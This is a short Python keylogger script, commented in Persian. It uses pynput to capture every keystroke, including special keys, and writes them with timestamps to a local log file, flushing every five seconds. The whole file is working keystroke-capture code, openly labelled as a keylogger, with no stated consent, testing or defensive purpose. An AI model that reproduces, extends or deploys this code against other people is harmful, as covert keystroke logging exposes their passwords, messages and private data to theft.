from pynput import keyboard
from datetime import datetime
import os
import threading
import time

# مسیر فایل لاگ
log_path = "logs/keys.txt"
buffer = ""

# ساخت پوشه و فایل لاگ
def ensure_log_file():
    os.makedirs("logs", exist_ok=True)
    if not os.path.exists(log_path):
        with open(log_path, "w", encoding="utf-8") as f:
            f.write("=== Keylogger Started ===\n")

# ذخیره رشته در فایل
def flush_buffer():
    global buffer
    if buffer.strip():
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {buffer}\n")
        buffer = ""

# تبدیل کلید به رشته قابل ثبت
def format_key(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char  # حروف، اعداد، علامت‌ها
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "[TAB]"
        elif key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            return "[SHIFT]"
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            return "[CTRL]"
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            return "[ALT]"
        elif key == keyboard.Key.esc:
            return "[ESC]"
        elif key == keyboard.Key.delete:
            return "[DEL]"
        else:
            return f"[{key.name.upper()}]"
    except:
        return "[UNKNOWN]"

# شروع کی‌لاگر
def start_keylogger():
    ensure_log_file()
    print("🔑 Keylogger is running...")

    def on_press(key):
        global buffer
        try:
            k = format_key(key)
            if k == "\n":
                flush_buffer()
            else:
                buffer += k
        except Exception as e:
            print(f"[ERROR] Keylogger: {e}")

    def auto_flush():
        while True:
            time.sleep(5)
            flush_buffer()

    threading.Thread(target=auto_flush, daemon=True).start()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()